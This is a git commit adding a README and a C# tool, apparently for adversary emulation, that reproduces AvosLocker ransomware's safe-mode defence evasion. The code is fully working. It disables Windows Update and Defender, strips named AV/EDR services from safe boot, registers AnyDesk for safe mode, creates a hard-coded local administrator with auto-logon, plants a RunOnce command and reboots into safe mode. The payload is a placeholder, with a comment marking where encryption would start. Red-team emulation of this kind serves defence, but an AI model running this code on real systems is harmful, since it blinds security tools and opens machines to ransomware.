e45430551e42e203f709677928f711ab21e8be5b
Ma-Cr <66275890+Ma-Cr@users.noreply.github.com>
2022-07-01 20:27:47 -0400

    Added C# and readme
    + Initial unsafe-mode.cs
    + Initial readme
    + Initial resources in readme

--- README.md
+++ README.md
@@ -1,2 +1,11 @@
 # unsafe-mode
  
+ This repo is for a C# project centered around restarting a Windows machine to safe mode in order to bypass defences. This technique is detailed as [T1562.009](https://attack.mitre.org/techniques/T1562/009/) by Mitre Att&ck.
+ Specifically, the TTPs covered in this project is intended to emulate pre-encryption steps taken by the AvosLocker Ransomware group. However, this method is also used by REvil, and BlackMatter.
+ A simple echo command is used in the RunOnce registry key for a proof of concept, but that is typically where the encryption process starts for AvosLocker.
+ 
+ ---
+ - https://news.sophos.com/en-us/2021/12/22/avos-locker-remotely-accesses-boxes-even-running-in-safe-mode/
+ - https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-avoslocker
+- https://www.bleepingcomputer.com/news/security/avoslocker-ransomware-reboots-in-safe-mode-to-bypass-security-tools/
+- https://blog.malwarebytes.com/threat-intelligence/2021/07/avoslocker-enters-the-ransomware-scene-asks-for-partners/
---
+++ unsafe-mode.cs
@@ -0,0 +1,109 @@
+/*
+ * Requires being run in a high integrity process
+*/
+
+using System;
+using System.Diagnostics;
+using Microsoft.Win32;
+
+namespace UnsafeMode 
+{
+    class UnsafeMode
+    {
+        static void RegEdit(string operation, string RegPath, string RegName, string RegValue, int valueKind) {
+            Microsoft.Win32.RegistryKey key;
+            switch (operation) {
+                case "add":
+                    Console.WriteLine("[!] Writing the {0} Reg Value", RegName);
+                    key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, true);
+                    if (valueKind == 1)
+                    {
+                        key.SetValue(RegName, RegValue, RegistryValueKind.DWord);
+                    }
+                    else
+                    {
+                        key.SetValue(RegName, RegValue);
+                    }
+                    key.Close();
+                    break;
+                case "del":
+                    Console.WriteLine("[!] Deleting the {0} Reg Value", RegName);
+                    key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, true);
+                    try
+                    {
+                        key.DeleteValue(RegName);
+                    }
+                    catch (System.ArgumentException e) {
+						//assuming Arg Except is due to already missing the key
+                        Console.WriteLine("[+] {0} doesn't exist", RegName);
+                    }
+                    key.Close();
+                    break;
+                case "addKey":
+                    Console.WriteLine("[!] Creating the {0} Reg Key", RegName);
+                    key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(RegPath + @"\" + RegName, true);
+                    key.Close();
+                    break;
+                default:
+                    Console.WriteLine("default");
+                    break;
+            }
+        }
+        static void RunCommand(string Command) {
+            Process p = new Process();
+            p.StartInfo.UseShellExecute = false;
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.RedirectStandardError = true;
+            p.StartInfo.FileName = @"CMD.EXE";
+            p.StartInfo.Arguments = @"/C " + Command;
+            p.Start();
+            string output = p.StandardOutput.ReadToEnd();
+            string error = p.StandardError.ReadToEnd();
+            p.WaitForExit();
+            Console.WriteLine("[+] Ran command: {0}", Command);
+            Console.WriteLine(output);
+            Console.WriteLine(error);
+        }
+        static void Main(string[] args) {
+			//CHANGE THESE
+			//Avos typically uses a DC hosted payload for encryption
+            string runOnce = @"cmd.exe /c mkdir C:\Temp & echo POC > C:\Temp\poc.txt";
+            string userName = "newadmin";
+            string password = "Password123456";
+
+            Console.WriteLine("Unsafe Mode\n============================");
+            RunCommand("net stop wuauserv");
+            RunCommand("sc config wuauserv start= disabled");
+            RegEdit("add", @"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1", 1);
+            //trying to disable typical AV/EDR when running in safe mode
+            string[] delete = {"SepMasterService", "CbDefense", "CbDefenseWSC", "EPProtectedService", "epredline", "CylanceSvc", "SAVService", "klnagent", "Sophos File Scanner Service", "SntpService", "EPSecurityService", "EPUpdateService", "EPIntegrationService", "TmCCSF", "TmWSCSvc"};
+			foreach(string protection in delete)
+			{
+				RegEdit("del", @"SYSTEM\CurrentControlSet\Control\SafeBoot\Network", protection, "", 0);
+			}
+            //adding anydesk to run in safemode (Avos abuses anydesk)
+            RegEdit("addKey", @"SYSTEM\CurrentControlSet\Control\SafeBoot\Network", "AnyDeskMSI", "", 0);
+            RegEdit("add", @"SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AnyDeskMSI", "", "Service", 0); //writes to the (default) reg value
+            RegEdit("addKey", @"SYSTEM\CurrentControlSet\Control\SafeBoot\Network", "AnyDesk", "", 0);
+            RegEdit("add", @"SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AnyDesk", "", "Service", 0);
+            //setting up auto logon & runonce reg
+            RegEdit("del", @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "DefaultDomainName", "", 0);
+            RegEdit("add", @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "DefaultUserName", userName, 0);
+            RegEdit("add", @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "DefaultPassword", password, 0);
+            RegEdit("add", @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "AutoAdminLogon", "1", 0);
+            RegEdit("add", @"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", "*a", runOnce + " & bcdedit /deletevalue {default} safeboot", 0); //not adding the restart after bcdedit which is typical for Avos
+            //setting up new admin user
+            RunCommand("net user " + userName + " " + password + " /add");
+            RunCommand("net localgroup Administrators " + userName + " /add");
+            //deleting legal notices to make autologon smoother
+            RegEdit("del", @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "LegalNoticeCaption", "", 0);
+            RegEdit("del", @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "LegalNoticeText", "", 0);
+            RegEdit("del", @"SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system", "LegalNoticeCaption", "", 0);
+            RegEdit("del", @"SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system", "LegalNoticeText", "", 0);
+            //restarting to safe mode
+            RunCommand("bcdedit /set {default} safeboot network");
+            RunCommand("bcdedit /set {current} bootstatuspolicy ignoreallfailures");
+            RunCommand("shutdown -r -t 0");
+        }
+    }     
+}
